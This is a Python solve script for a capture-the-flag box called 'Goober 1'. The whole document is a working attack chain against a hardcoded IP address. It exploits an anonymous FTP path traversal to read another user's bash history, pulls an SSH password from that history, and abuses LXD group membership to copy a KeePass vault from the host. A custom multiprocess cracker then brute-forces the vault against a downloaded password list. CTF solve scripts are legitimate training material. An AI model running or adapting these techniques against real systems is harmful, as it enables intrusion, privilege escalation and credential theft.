#!/usr/bin/env python3
# /// script
# requires-python = ">=3.11"
# dependencies = [
#   "paramiko>=3.4.0",
#   "pykeepass>=4.0.0",
# ]
# ///
"""Goober 1 (CIT 2026 Fullpwn).

Full chain:
  1. anon uftpd 2.9 path traversal  →  /home/jimbo/.bash_history  →  jimbo's SSH pw
  2. SSH jimbo  →  `lxc exec hostpwn -- cat /mnt/host/home/greg/vault.kdbx`
     (jimbo is in group lxd; `hostpwn` is a privileged LXD container that mounts
      the host `/` at /mnt/host)
  3. locally crack vault.kdbx with rockyou top-10k  →  "winter" hits at #199
  4. pykeepass open, flag1 is in the notes of the `login` entry
"""
from __future__ import annotations

import ftplib
import hashlib
import hmac as _hmac
import io
import pathlib
import re
import struct
import sys
import urllib.request
from multiprocessing import Pool, cpu_count

import paramiko
from Cryptodome.Cipher import AES
from pykeepass import PyKeePass

HERE = pathlib.Path(__file__).resolve().parent
HOST = "23.179.17.69"
FTP_PORT, SSH_PORT = 10921, 22
PASSWORD_RE = re.compile(r"mysql -u jimbo -p([A-Za-z0-9]+)")
ROCKYOU_10K = (
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/"
    "Passwords/Common-Credentials/10k-most-common.txt"
)


class HostPasvFTP(ftplib.FTP):
    def makepasv(self):
        _, port = super().makepasv()
        return self.sock.getpeername()[0], port


def ftp_fetch(path: str) -> bytes:
    ftp = HostPasvFTP()
    ftp.connect(HOST, FTP_PORT, timeout=15)
    ftp.login("anonymous", "anonymous@")
    buf: list[bytes] = []
    ftp.retrbinary(f"RETR {path}", buf.append)
    ftp.quit()
    return b"".join(buf)


def ssh(cmd: str, user: str, pw: str, timeout: int = 30) -> bytes:
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, port=SSH_PORT, username=user, password=pw,
              look_for_keys=False, allow_agent=False,
              timeout=20, banner_timeout=20, auth_timeout=20)
    try:
        _, stdout, _ = c.exec_command(cmd, timeout=timeout)
        return stdout.read()
    finally:
        c.close()


def parse_kdbx(raw: bytes):
    pos = 12
    fields: dict[int, bytes] = {}
    while pos < len(raw):
        fid = raw[pos]; pos += 1
        (flen,) = struct.unpack("<I", raw[pos:pos + 4]); pos += 4
        fields[fid] = raw[pos:pos + flen]
        pos += flen
        if fid == 0:
            break
    kdf_raw = fields[11]
    vpos = 2
    kdf: dict[str, bytes] = {}
    while vpos < len(kdf_raw):
        t = kdf_raw[vpos]; vpos += 1
        if t == 0:
            break
        (nl,) = struct.unpack("<I", kdf_raw[vpos:vpos + 4]); vpos += 4
        name = kdf_raw[vpos:vpos + nl].decode(); vpos += nl
        (vl,) = struct.unpack("<I", kdf_raw[vpos:vpos + 4]); vpos += 4
        kdf[name] = kdf_raw[vpos:vpos + vl]; vpos += vl
    return {
        "master_seed": fields[4],
        "salt": kdf["S"],
        "rounds": struct.unpack("<Q", kdf["R"])[0],
        "header": raw[:pos],
        "header_hmac": raw[pos + 32:pos + 64],
    }


def verify(pw: str, P: dict) -> bool:
    ck = hashlib.sha256(hashlib.sha256(pw.encode()).digest()).digest()
    cipher = AES.new(P["salt"], AES.MODE_ECB)
    b1, b2 = ck[:16], ck[16:]
    for _ in range(P["rounds"]):
        b1 = cipher.encrypt(b1)
        b2 = cipher.encrypt(b2)
    transformed = hashlib.sha256(b1 + b2).digest()
    base = hashlib.sha512(P["master_seed"] + transformed + b"\x01").digest()
    idx = (0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
    hk = hashlib.sha512(idx + base).digest()
    mac = _hmac.new(hk, P["header"], hashlib.sha256).digest()
    return mac == P["header_hmac"]


_P: dict | None = None


def _init(P: dict) -> None:
    global _P
    _P = P


def _try(pw: str):
    try:
        return pw if verify(pw, _P) else None  # type: ignore[arg-type]
    except Exception:
        return None


def crack(kdbx_bytes: bytes, wordlist: list[str]) -> str | None:
    P = parse_kdbx(kdbx_bytes)
    with Pool(cpu_count(), initializer=_init, initargs=(P,)) as pool:
        for hit in pool.imap_unordered(_try, wordlist, chunksize=4):
            if hit:
                pool.terminate()
                return hit
    return None


def main() -> None:
    # 1. jimbo password from FTP-leaked bash history
    history = ftp_fetch("../../home/jimbo/.bash_history").decode("utf-8", "replace")
    m = PASSWORD_RE.search(history)
    assert m, "jimbo password not in bash history"
    jimbo_pw = m.group(1)
    print(f"[+] jimbo pw: {jimbo_pw}")

    # 2. pull greg's vault through the privileged LXD container
    b64 = ssh(
        "lxc exec hostpwn -- sh -c 'cat /mnt/host/home/greg/vault.kdbx | base64'",
        "jimbo", jimbo_pw,
    )
    kdbx = __import__("base64").b64decode(b"".join(b64.splitlines()))
    print(f"[+] vault.kdbx: {len(kdbx)} bytes")

    # 3. crack
    print("[*] fetching rockyou top-10k…")
    words = urllib.request.urlopen(ROCKYOU_10K, timeout=15).read().decode().splitlines()
    pw = crack(kdbx, [w for w in words if w])
    assert pw, "vault password not in rockyou top-10k"
    print(f"[+] vault pw: {pw}")

    # 4. read flag from entry notes
    kp = PyKeePass(io.BytesIO(kdbx), password=pw)
    for entry in kp.entries:
        if entry.notes and "CIT{" in entry.notes:
            print(entry.notes.strip())
            return
    raise RuntimeError("flag not found in any entry")


if __name__ == "__main__":
    main()
